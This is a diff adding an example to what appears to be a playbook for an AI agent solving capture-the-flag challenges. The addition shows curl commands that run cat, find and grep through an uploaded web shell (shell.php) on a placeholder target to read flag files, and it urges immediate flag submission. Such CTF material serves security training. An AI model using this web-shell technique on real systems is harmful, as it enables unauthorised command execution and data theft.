@@ -27,3 +27,15 @@ grep -R --binary-files=without-match -E 'flag\\{[^}]{6,}\\}' /challenge /app /va
 
 - If a string matches `flag{...}`, call `submit_flag` immediately, even if it may have been submitted before.
 - In multi-flag challenges, keep going after one flag until official completion or timeout.
+
+## Example Scenario
+
+After getting RCE:
+
+```bash
+curl -sG --data-urlencode 'cmd=cat /challenge/flag1.txt' http://target/uploads/shell.php
+curl -sG --data-urlencode 'cmd=find /var/www /app -maxdepth 4 -type f -iname "flag*" 2>/dev/null' http://target/uploads/shell.php
+curl -sG --data-urlencode 'cmd=grep -R -E "flag\\{[^}]+" /var/www /app 2>/dev/null | head -n 30' http://target/uploads/shell.php
+```
+
+If a Redis or MariaDB dump contains `flag{...}`, submit it immediately before continuing. Do not wait to “collect them all first”.
